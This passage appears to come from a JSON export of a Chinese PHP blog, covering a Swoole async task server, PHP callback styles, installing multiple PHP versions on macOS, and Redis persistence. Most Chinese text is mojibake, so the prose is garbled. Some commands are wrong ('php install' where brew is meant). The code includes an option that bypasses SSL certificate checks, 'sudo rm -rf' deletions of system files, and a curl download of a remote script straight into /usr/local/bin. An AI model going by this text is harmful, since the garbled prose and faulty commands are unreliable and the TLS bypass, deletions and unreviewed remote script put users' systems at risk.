onReceive($server, $fd, $form_id, $data)&#123; &#x2F;&#x2F; æŠ•é€’ä»»åŠ¡ $server-&gt;task($data); $server-&gt;send($fd, &quot;è¿™æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€çš„ä¿¡æ¯ï¼š&#123;$data&#125;&quot;); &#125; &#x2F;** * ç›‘å¬å¼‚æ­¥ä»»åŠ¡taskäº‹ä»¶ * @param $server * @param $task_id * @param $worker_id * @param $data * @return string *&#x2F; public function onTask($server, $task_id, $worker_id, $data)&#123; $data &#x3D; json_decode($data, true); echo &quot;å¼€å§‹æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡&quot;.PHP_EOL; try &#123; &#x2F;&#x2F; å¼€å§‹æ‰§è¡Œä»»åŠ¡ $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;å¼€å§‹æ‰§è¡Œä»»åŠ¡&quot;.PHP_EOL ); &#x2F;&#x2F; é€šçŸ¥workerï¼ˆå¿…é¡» returnï¼Œå¦åˆ™ä¸ä¼šè°ƒç”¨ onFinishï¼‰ return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]); &#125; catch (Exception $exception) &#123; &#x2F;&#x2F; æ‰§è¡Œä»»åŠ¡å¤±è´¥ $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;æ‰§è¡Œä»»åŠ¡å¤±è´¥&quot;.PHP_EOL); &#125; &#125; &#x2F;** * ç›‘å¬finish äº‹ä»¶ * @param $server * @param $task_id * @param $data *&#x2F; public function onFinish($server, $task_id, $data)&#123; $this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œå®Œæˆ&quot;.PHP_EOL); print_r( &quot;æ¥è‡ªæœåŠ¡ç«¯çš„æ¶ˆæ¯ï¼š&#123;$data&#125;&quot;); &#125; &#x2F;** * ç›‘å¬å…³é—­è¿æ¥äº‹ä»¶ * @param $server * @param $fd *&#x2F; public function onClose($server, $fd)&#123; echo &quot;å…³é—­TCP è¿æ¥&quot;.PHP_EOL; &#125; &#x2F;** * å‘èµ·Get æˆ– Post è¯·æ±‚ * @param string $url è¯·æ±‚åœ°å€ * @param array $request_data è¯·æ±‚å‚æ•° * @param string $request_type è¯·æ±‚ç±»å‹ * @param array $headers å¤´ä¿¡æ¯ * @param bool $is_ssl æ˜¯å¦æ˜¯ssl * @return bool|string *&#x2F; public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false) &#123; $curl &#x3D; curl_init (); &#x2F;&#x2F; åˆå§‹åŒ– &#x2F;&#x2F; è®¾ç½® URL curl_setopt($curl, CURLOPT_URL, $url); &#x2F;&#x2F; ä¸è¿”å› Response å¤´éƒ¨ä¿¡æ¯ curl_setopt ( $curl, CURLOPT_HEADER, 0 ); &#x2F;&#x2F; å¦‚æœæˆåŠŸåªå°†ç»“æœè¿”å›ï¼Œä¸è‡ªåŠ¨è¾“å‡ºä»»ä½•å†…å®¹ curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 ); &#x2F;&#x2F; è®¾ç½®è¯·æ±‚å‚æ•° curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data)); &#x2F;&#x2F; TRUE æ—¶è¿½è¸ªå¥æŸ„çš„è¯·æ±‚å­—ç¬¦ä¸² curl_setopt($curl, CURLINFO_HEADER_OUT, true); &#x2F;&#x2F; Post ç±»å‹å¢åŠ ä»¥ä¸‹å¤„ç† if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123; &#x2F;&#x2F; è®¾ç½®ä¸ºPOSTæ–¹å¼ curl_setopt ( $curl, CURLOPT_POST, 1 ); &#x2F;&#x2F; è®¾ç½®å¤´ä¿¡æ¯ curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data)))); &#x2F;&#x2F; è®¾ç½®è¯·æ±‚å‚æ•° curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data)); &#x2F;&#x2F; å½“POST æ•°æ®å¤§äº1024 æ—¶å¼ºåˆ¶æ‰§è¡Œ curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;)); &#125; &#x2F;&#x2F; åˆ¤æ–­æ˜¯å¦ç»•è¿‡è¯ä¹¦ if( $is_ssl ) &#123; &#x2F;&#x2F;ç»•è¿‡ssléªŒè¯ curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); &#125; if(!empty($headers)) curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); &#x2F;&#x2F; æ‰§è¡Œ $result &#x3D; curl_exec ( $curl ); if ( $result &#x3D;&#x3D; FALSE) return false; &#x2F;&#x2F; å…³é—­èµ„æº curl_close ( $curl ); return $result; &#125; &#x2F;** * å†™å…¥æ—¥å¿— * @param $content *&#x2F; public function addLog($content)&#123; $path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;; if (!is_dir($path)) mkdir($path,0777,true); $file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;; if (!file_exists($file_name)) &#123; touch($file_name); chown($file_name, &quot;root&quot;); &#125; $file_log &#x3D; fopen($file_name, &quot;a&quot;); fputs($file_log, $content); fclose($file_log); &#125;&#125;$server &#x3D; new taskServer(); å®¢æˆ·ç«¯è¿™é‡Œçš„å®¢æˆ·ç«¯å¯ä»¥æ˜¯ cli è„šæœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹åº”æ§åˆ¶å™¨ä¸­çš„å…·ä½“æ–¹æ³•ï¼Œåªè¦èƒ½è¿æ¥Swoole ç›‘å¬çš„Tcp å°±è¡Œã€‚ 12345678910111213141516171819202122232425&lt;?phpnamespace app\\admin\\controller;class Index extends Base&#123; public function index()&#123; $client &#x3D; new \\Swoole\\Client(SWOOLE_SOCK_TCP); if (!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123; return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\\n&quot;); &#125; $data &#x3D; [ &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;, &quot;data&quot; &#x3D;&gt; [ &quot;key&quot; &#x3D;&gt; &quot;key&quot;, &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;, &quot;from&quot; &#x3D;&gt; &quot;sms&quot;, &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;, &quot;text&quot; &#x3D;&gt; &quot;test&quot;, ], &quot;type&quot; &#x3D;&gt; &quot;get&quot; ]; $client-&gt;send(json_encode($data)); return json($client-&gt;recv()); &#125;&#125; å‚è€ƒé“¾æ¥ phpä½¿ç”¨Swooleæ¥å®ç°å®æ—¶å¼‚æ­¥ä»»åŠ¡é˜Ÿåˆ— åŸºäº swoole ä¸‹ å¼‚æ­¥æ¶ˆæ¯é˜Ÿåˆ— API","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼","slug":"php-s-four-ways-to-set-callback-functions","date":"2020-11-25T14:18:04.000Z","updated":"2020-11-25T14:19:29.255Z","comments":true,"path":"php-s-four-ways-to-set-callback-functions/","link":"","permalink":"https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/","excerpt":"æœ€è¿‘åœ¨å­¦ä¹ Swooleï¼Œé¡ºæ‰‹æ•´ç†ä¸€ä¸‹PHP ä¸­çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼ã€‚","text":"æœ€è¿‘åœ¨å­¦ä¹ Swooleï¼Œé¡ºæ‰‹æ•´ç†ä¸€ä¸‹PHP ä¸­çš„å››ç§è®¾ç½®å›è°ƒå‡½æ•°çš„æ–¹å¼ã€‚ åŒ¿åå‡½æ•°1234&lt;?php$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123; echo &quot;Http Server&quot;;&#125;); ç±»é™æ€å‡½æ•°1234567class A&#123; static function onConnect($server, $fd)&#123; echo &quot;UDP Server&quot;; &#125;&#125;$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]); å‡½æ•°12345$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);function callBack($server, $fd)&#123; echo &quot;Tcp Server&quot;;&#125; å¯¹è±¡æ–¹æ³•12345678910111213141516171819# æƒ…æ™¯ä¸€Class A&#123; public function __construct()&#123; $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]); &#125; public function onOpen($server, $request)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;# æƒ…æ™¯äºŒClass A&#123; function onOpen($request, $respone)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;$obj &#x3D; new A();$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"å¦‚ä½•åœ¨ Mac OS ä¸Šå®‰è£…å¤šç‰ˆæœ¬çš„ PHP","slug":"how-to-install-multiple-versions-of-php-on-mac-os","date":"2020-11-24T15:42:11.000Z","updated":"2020-11-24T15:45:22.053Z","comments":true,"path":"how-to-install-multiple-versions-of-php-on-mac-os/","link":"","permalink":"https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/","excerpt":"å¾ˆä¹…ä¹‹å‰åœ¨Mac ä¸Šåšå¼€å‘ï¼Œèµ·åˆæ­å»ºç¯å¢ƒæ—¶é‡åˆ°äº†éƒ¨åˆ†é—®é¢˜ï¼ŒåŠ ä¸ŠMac é¢„è£…çš„é‚£ä¸ªPHP ç‰ˆæœ¬ï¼Œå®åœ¨æ˜¯ä¸å¥½ç”¨ï¼Œphp-fpm æ€»æ˜¯å¯ä¸åŠ¨ï¼Œæœ€åç´¢æ€§å†³å®šåœ¨æœ¬åœ°è‡ªå·±è£…ä¸ªå¤šç‰ˆæœ¬ï¼Œå¯ä»¥éšæ—¶è‡ªç”±åˆ‡æ¢ã€‚","text":"å¾ˆä¹…ä¹‹å‰åœ¨Mac ä¸Šåšå¼€å‘ï¼Œèµ·åˆæ­å»ºç¯å¢ƒæ—¶é‡åˆ°äº†éƒ¨åˆ†é—®é¢˜ï¼ŒåŠ ä¸ŠMac é¢„è£…çš„é‚£ä¸ªPHP ç‰ˆæœ¬ï¼Œå®åœ¨æ˜¯ä¸å¥½ç”¨ï¼Œphp-fpm æ€»æ˜¯å¯ä¸åŠ¨ï¼Œæœ€åç´¢æ€§å†³å®šåœ¨æœ¬åœ°è‡ªå·±è£…ä¸ªå¤šç‰ˆæœ¬ï¼Œå¯ä»¥éšæ—¶è‡ªç”±åˆ‡æ¢ã€‚ æ˜¯å¦éœ€è¦æ¸…é™¤æ—§ç‰ˆæœ¬ï¼Ÿ å› ä¸ºéœ€è¦åœ¨Mac ä¸Šå®‰è£…å…¶ä»–ç‰ˆæœ¬ï¼Œæ‰€ä»¥é¢„è£…çš„é‚£ä¸ªç‰ˆæœ¬çš„PHP çš„å­˜åœ¨å°±æ²¡å•¥æ„ä¹‰äº†ã€‚è€ƒè™‘åˆ°æœ¬æœºçš„å…¶ä»–è½¯ä»¶å¯èƒ½ä¼šä¾èµ–å®ƒï¼Œä¸ºäº†ç»™ä»¥åçœäº›äº‹ï¼Œæœ€åè¿˜æ˜¯å†³å®šå°†é¢„è£…çš„ç‰ˆæœ¬ç»™ç§»é™¤æ‰ã€‚ äº‹å®è¯æ˜ç§»é™¤äº†ä¹Ÿæ²¡å…³ç³»ã€‚ ç§»é™¤æ—§ç‰ˆæœ¬è¿™é‡Œè¯´çš„æ—§ç‰ˆæœ¬æŒ‡çš„æ˜¯Mac è‡ªå¸¦çš„PHPç‰ˆæœ¬ã€‚ 123456789101112# &#x2F;private&#x2F;etc&#x2F;$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;# &#x2F;usr&#x2F;bin&#x2F;$ sudo rm -rfi php php-config phpize# &#x2F;usr&#x2F;lib&#x2F;$ sudo rm -rf php&#x2F;# &#x2F;usr&#x2F;sbin&#x2F;$ sudo rm -rf php-fpm# &#x2F;usr&#x2F;share&#x2F;$ sudo rm -rf php# &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;$ sudo rm -rf php-config.1 php.1 phpize.1 æ‰§è¡Œå®Œä¸Šé¢è¿™äº›å‘½ä»¤å°±èƒ½å°†æ—§ç‰ˆæœ¬çš„PHP å½»åº•çš„ä»ä½ çš„Mac ä¸Šç§»é™¤äº†ã€‚ å®‰è£…å¤šç‰ˆæœ¬ç›´åˆ°2018å¹´3æœˆåº•ï¼Œæ‰€æœ‰PHP ç›¸å…³çš„brew éƒ½ç”± homebrew/php tab å¤„ç†ï¼Œä½†æ˜¯å·²ç»å¼ƒç”¨äº†ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬ä½¿ç”¨homebrew/coreåŒ…ä¸­çš„å¯ç”¨çš„å†…å®¹ã€‚è¿™åº”è¯¥æ˜¯ä¸€ä¸ªæ›´å¥½ç»´æŠ¤ä½†æ˜¯ä¸å¤ªå®Œæ•´çš„åŒ…ã€‚ ç”±äºPHP5.6å’ŒPHP7.0åœ¨ Homebrew ä¸Šå·²è¢«å¼ƒç”¨ï¼Œå› ä¸ºä»¥ä¸è¢«æ”¯æŒï¼Œè™½ç„¶ä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œä½†è¿˜æ˜¯å¯ä»¥åœ¨å¼€å‘ç¯å¢ƒä¸­ä½¿ç”¨è¿™äº›ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ï¼Œå¯ä»¥å‚è€ƒï¼šPHPæ”¯æŒçš„ç‰ˆæœ¬ã€‚ è¯·è®°ä½ï¼ŒHomebrew æ­£å¼æ”¯æŒPHP7.1 åˆ° 7.3 ï¼Œå› æ­¤å¦‚æœè¦å®‰è£… PHP5.6æˆ–PHP7.0ï¼Œåˆ™éœ€è¦æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12345$ brew tap exolnet&#x2F;homebrew-deprecatedUpdating Homebrew...&#x3D;&#x3D;&gt; Auto-updated Homebrew!Updated 1 tap (homebrew&#x2F;core).â€¦â€¦ æ¥ä¸‹æ¥æ­£å¼å¼€å§‹å®‰è£…PHP çš„å„ç§ç‰ˆæœ¬ï¼Œå¹¶ä½¿ç”¨ç®€å•çš„è„šæœ¬æ¥è¿›è¡Œç‰ˆæœ¬ä¹‹é—´çš„åˆ‡æ¢ã€‚ 12345$ php install php@5.6$ php install php@7.0$ php install php@7.1$ php install php@7.2$ php install php@7.3 ç¬¬ä¸€ä¸ªå®‰è£…æ‰€èŠ±è´¹çš„æ—¶é—´é•¿ä¸€äº›ï¼Œå› ä¸ºéœ€è¦å®‰è£…ä¸€å †brew çš„ä¾èµ–ï¼Œéšåå…¶ä»–ç‰ˆæœ¬çš„å®‰è£…çš„å°†å¾ˆå¿«ã€‚ æ‰€å®‰è£…å„ç‰ˆæœ¬çš„PHPéƒ½åœ¨è¯¥ç›®å½•ä¸‹ï¼š 12345$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php5.6 7.0 7.1 7.2 7.3# php.ini é…ç½®æ–‡ä»¶ç›®å½•&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini å®‰è£…å®Œä»¥ä¸Šç‰ˆæœ¬çš„PHP ä¹‹åï¼Œæ‰§è¡Œï¼š 12345$ php -v PHP 7.3.5 (cli) (built: May 2 2019 12:40:36) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies å¯ä»¥çœ‹åˆ°ç›®å‰æ‰€ä½¿ç”¨çš„PHP ç‰ˆæœ¬æ˜¯7.3ï¼ˆæœ€åå®‰è£…å®Œçš„é‚£ä¸ªï¼‰ï¼Œç°åœ¨è¯•å›¾åˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªå®‰è£…çš„PHP ç‰ˆæœ¬ï¼š 1$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6 unlick å®‰è£…PHP ç‰ˆæœ¬ä¹‹é—´ä¸å†éœ€è¦è”ç³»ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹ä»–ä»¬æ˜¯æ²¡æœ‰ç¬¦å·é“¾æ¥ã€‚ å†æ¬¡æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼š 12345$ php -vPHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies åˆ‡æ¢çš„æŒºé¡ºåˆ©çš„ï¼Œä½†å¦‚æœæ¯æ¬¡éœ€è¦åˆ‡æ¢æ—¶éƒ½éœ€è¦è¿™æ ·è¾“å…¥å°±å˜å¾—å¾ˆéº»çƒ¦äº†ï¼Œå¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººå·²ç»ä¸ºæˆ‘ä»¬å®Œæˆäº†è‰°è‹¦çš„å·¥ä½œï¼Œå¹¶ç¼–å†™äº†ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„è„šæœ¬â€”â€”PHPåˆ‡æ¢å™¨è„šæœ¬ã€‚ å°†sphpè„šæœ¬å®‰è£…åˆ° brew çš„æ ‡å‡†ä¸­/usr/local/binï¼š 12$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp å¤šç‰ˆæœ¬åˆ‡æ¢å®Œæˆè¿™äº›æ­¥éª¤åï¼Œå°±èƒ½å¤Ÿä½¿ç”¨è„šæœ¬å‘½ä»¤åˆ‡æ¢PHPç‰ˆæœ¬ï¼š 1$ sphp 7.2 ä½¿ç”¨æ—¶ä¼šéœ€è¦æä¾›ç®¡ç†å‘˜å¯†ç ï¼Œç›¸æ¯”é•¿é•¿çš„å‘½ä»¤è¿™å·²ç»çœäº‹å¾ˆå¤šäº†ã€‚ å¥½äº†ï¼Œåˆ°è¿™é‡Œå°±é¡ºåˆ©çš„å®Œæˆäº†å¤šç‰ˆæœ¬çš„PHP å®‰è£…ä»¥åŠåˆ‡æ¢ã€‚ ç®¡ç† PHP æœåŠ¡åœ¨ä¸éœ€è¦åˆ‡æ¢ç‰ˆæœ¬æ—¶ï¼Œä½¿ç”¨brew serviceså‘½ä»¤å¯ä»¥å¯¹è¯¥ç‰ˆæœ¬çš„PHP è¿›è¡Œç®¡ç†ï¼š å¯åŠ¨/åœæ­¢/é‡å¯ PHPæœåŠ¡ï¼š 1$ brew services start&#x2F;stop&#x2F;restart php å½“PHP æœåŠ¡å¯åŠ¨æ—¶ï¼Œé€šè¿‡æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œå¯ä»¥å‘ç°å¤šäº†å‡ ä¸ªåä¸ºphp-fpm çš„è¿›ç¨‹ã€‚ php-fpmçš„è¿›ç¨‹æ‰€åœ¨ç›®å½•ï¼š/usr/local/opt/php/sbin/php-fpm è¿™ä¸ªè¿›ç¨‹å¾ˆé‡è¦ï¼Œåœ¨ä¸ Nginx äº¤äº’æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯åŠ¨å®ƒï¼Œé€šå¸¸ä¼šæ”¶åˆ° 502 Bad Gateway çš„é”™è¯¯ã€‚ å¯åŠ¨ php-fpmå°½ç®¡ä¸éœ€è¦åˆ»æ„çš„å»ç®¡ç†è¿™ä¸ªè¿›ç¨‹ï¼Œä½†å¦‚æœè¿™ä¸ªè¿›ç¨‹æ„å¤–åœæ­¢è¿è¡Œäº†ï¼Œè¿˜æ˜¯è¦çŸ¥é“è¯¥å¦‚ä½•å¯åŠ¨å®ƒã€‚ å‰å°å¯åŠ¨12$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm ç”¨è¿™ç§æ–¹å¼å¯åŠ¨ï¼Œå½“ä½¿ç”¨âŒƒ Cé€€å‡ºæ—¶ï¼Œè¿›ç¨‹ä¹Ÿä¼šè·Ÿç€é€€å‡ºã€‚ åå°å¯åŠ¨12# &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm &amp; å¦‚æœç”¨è¿™ç§æ–¹å¼å¯åŠ¨ï¼Œå°±ç®—é€€å‡ºäº†å½“å‰ä¼šè¯ï¼Œè¿›ç¨‹ä¼šä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œç€ã€‚ æ£€æŸ¥PHP ç‰ˆæœ¬æœ€åå†å•°å—¦ä¸¤å¥ï¼Œå¦‚æœéœ€è¦æŠŠå½“å‰5.6ç‰ˆæœ¬åˆ‡æ¢æˆ7.2ï¼Œé‚£ä¹ˆéœ€è¦åˆ†åˆ«åšä¸¤ä»¶äº‹ï¼š 123456# ç¬¬ä¸€æ­¥$ sphp 7.2# ç¬¬äºŒæ­¥$ brew services stop php@5.6$ brew services start php@7.2 å¦‚æœåªåšäº†è¿™ä¸€æ­¥ï¼Œé‚£ä¹ˆä½ ä¼šå‘ç° php -vçš„ç‰ˆæœ¬è¾“å‡ºçš„ç¡®æ˜¯ 7.2ï¼Œä½†php_info()æ‰€æ‰“å°çš„ç»“æœå´è¿˜æ˜¯ 5.6ã€‚ è¿™æ˜¯å› ä¸ºæœºå™¨ä¸Šå®‰è£…äº†å¤šä¸ªPHP ç‰ˆæœ¬ï¼Œå½“ä½¿ç”¨php -vå‘½ä»¤æ—¶ï¼Œå®ƒå°†æ˜¾ç¤ºé»˜è®¤PHP CLIçš„ç‰ˆæœ¬ï¼Œè€Œè¯¥ç‰ˆæœ¬å¯èƒ½ä¸æ˜¯ç½‘ç«™æ‰€ä½¿ç”¨çš„ç‰ˆæœ¬ã€‚ æ‰€ä»¥æ‰¾å‡ºç”¨äºç‰¹å®šç½‘ç«™çš„PHP ç‰ˆæœ¬çš„æœ€å¯é æ–¹æ³•æ˜¯ä½¿ç”¨phpinfo()å‡½æ•°ã€‚ å‚è€ƒé“¾æ¥ Mac ä¸‹ Nginxã€PHPã€MySQL å’Œ PHP-fpm çš„å®‰è£…å’Œé…ç½® å¦‚ä½•åœ¨Mac ä¸Šå®‰è£…å¤šç‰ˆæœ¬çš„PHP å¦‚ä½•å¸è½½Mac é¢„è£…çš„PHP å¦‚ä½•æ£€æŸ¥PHP ç‰ˆæœ¬","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Redis æŒä¹…åŒ–å¿«é€Ÿä¸Šæ‰‹","slug":"redis-persistence-quick-start","date":"2020-11-21T11:05:31.000Z","updated":"2020-11-23T12:34:07.708Z","comments":true,"path":"redis-persistence-quick-start/","link":"","permalink":"https://www.0x2beace.com/redis-persistence-quick-start/","excerpt":"ä»€ä¹ˆæ˜¯æŒä¹…åŒ–ï¼Ÿ Redis æ‰€æœ‰æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œå¯¹äºæ•°æ®çš„æ›´æ–°å°†å¼‚æ­¥çš„ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œå½“Rediså®ä¾‹é‡å¯æ—¶ï¼Œå³å¯åˆ©ç”¨ä¹‹å‰æŒä¹…åŒ–çš„æ–‡ä»¶å®ç°æ•°æ®æ¢å¤ã€‚","text":"ä»€ä¹ˆæ˜¯æŒä¹…åŒ–ï¼Ÿ Redis æ‰€æœ‰æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œå¯¹äºæ•°æ®çš„æ›´æ–°å°†å¼‚æ­¥çš„ä¿å­˜åœ¨ç£ç›˜ä¸­ï¼Œå½“Rediså®ä¾‹é‡å¯æ—¶ï¼Œå³å¯åˆ©ç”¨ä¹‹å‰æŒä¹…åŒ–çš„æ–‡ä»¶å®ç°æ•°æ®æ¢å¤ã€‚ ä¸»æµæ•°æ®åº“çš„æŒä¹…åŒ–æ–¹å¼ï¼š å¿«ç…§ Mysql dump Redis rdb æ—¥å¿— Mysql binlog Redis aof RDBä»€ä¹ˆæ˜¯RDBï¼ŸRedis é€šè¿‡ä¸€æ¡å‘½ä»¤æˆ–è€…æŸç§æ–¹å¼åˆ›å»º rdb æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ ¼å¼ï¼Œå­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ã€‚ å½“éœ€è¦å¯¹Redis è¿›è¡Œæ¢å¤æ—¶ï¼Œå°±å¯ä»¥å»åŠ è½½è¯¥æ–‡ä»¶ã€‚æ•°æ®æ¢å¤çš„ç¨‹åº¦ï¼Œå–å†³äº rdbæ–‡ä»¶ï¼ˆå¿«ç…§ï¼‰äº§ç”Ÿçš„æ—¶åˆ»ã€‚ ä¸‰ç§è§¦å‘æœºåˆ¶Redis ç”Ÿæˆ rdb æ–‡ä»¶æœ‰ä¸‰ç§æ–¹å¼ï¼Œåˆ†åˆ«æ˜¯ï¼š save bgsave è‡ªåŠ¨ç­–ç•¥ savesave å‘½ä»¤æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š åŒæ­¥é˜»å¡ æ–‡ä»¶ç­–ç•¥ï¼šå¦‚æœå­˜åœ¨æ—§çš„rdb æ–‡ä»¶ï¼Œåˆ™ä¼šæ›¿æ¢æˆæ–°çš„ å¤æ‚åº¦ï¼šOï¼ˆNï¼‰ bgsavebgsave å‘½ä»¤æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š å¼‚æ­¥éé˜»å¡ï¼ˆå‡ ä¹ä¸ä¼šé˜»å¡å®¢æˆ·ç«¯ï¼‰ æ–‡ä»¶ç­–ç•¥å’Œå¤æ‚åº¦åŒä¸Šã€‚ save è¿˜æ˜¯ bgsaveï¼Ÿ å‘½ä»¤ save bgsave IOç±»å‹ åŒæ­¥ å¼‚æ­¥ æ˜¯å¦é˜»å¡ æ˜¯ å¦ï¼ˆé˜»å¡å‘ç”Ÿåœ¨fork() å¤æ‚åº¦ O(n) O(n) ä¼˜ç‚¹ ä¸ä¼šæ¶ˆè€—é¢å¤–å†…å­˜ ä¸é˜»å¡å®¢æˆ·ç«¯ ç¼ºç‚¹ é˜»å¡å®¢æˆ·ç«¯ éœ€è¦forkï¼Œæ¶ˆè€—å†…å­˜ åœ¨æ•°æ®é‡ä¸å¤§çš„æƒ…å†µä¸‹ï¼Œå…¶å®ä½¿ç”¨save è¿˜æ˜¯bgsave å¹¶æ²¡æœ‰ä»€ä¹ˆå·®å¼‚ã€‚ å®ƒä¿©éƒ½æ˜¯éœ€è¦æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤æ‰ä¼šè§¦å‘æœºåˆ¶ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰è‡ªåŠ¨çš„æ–¹å¼å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ è‡ªåŠ¨ç­–ç•¥è‡ªåŠ¨ç”Ÿæˆç­–ç•¥æ˜¯æ ¹æ®æŸä¸ªè§„åˆ™æ¥å†³å®šæ˜¯å¦ç”Ÿæˆ rdb æ–‡ä»¶ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¹Ÿæ˜¯ä¸€ä¸ªbgsave çš„è¿‡ç¨‹ã€‚ é»˜è®¤ç­–ç•¥ï¼š|seconds|changes||-|-||900|1||300|10||60|10000| ä¸Šè¿°é…ç½®çš„æ„æ€æ˜¯ï¼šå¦‚æœåœ¨60s ä¸­åšäº†10000 æ¬¡æ”¹å˜æˆ–è€…åœ¨ 300s ä¸­åšäº† 10æ¬¡ æ”¹å˜ï¼Œæˆ–è€…åœ¨900s ä¸­åšäº† 1 æ¬¡æ”¹å˜ï¼Œåˆ™å‡ä¼šè§¦å‘bgsaveã€‚ é…ç½®12345678#save 900 1#save 300 10 #save 60 10000dbfilename dump.rdb &#x2F;&#x2F; rdb æ–‡ä»¶åç§°dir &#x2F;big_disk_path &#x2F;&#x2F; å·¥ä½œç›®å½•stop-writes-on-bgsave-error yes &#x2F;&#x2F; å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œåœæ­¢å†™å…¥rdbcompression yes &#x2F;&#x2F; é‡‡ç”¨å‹ç¼©æ 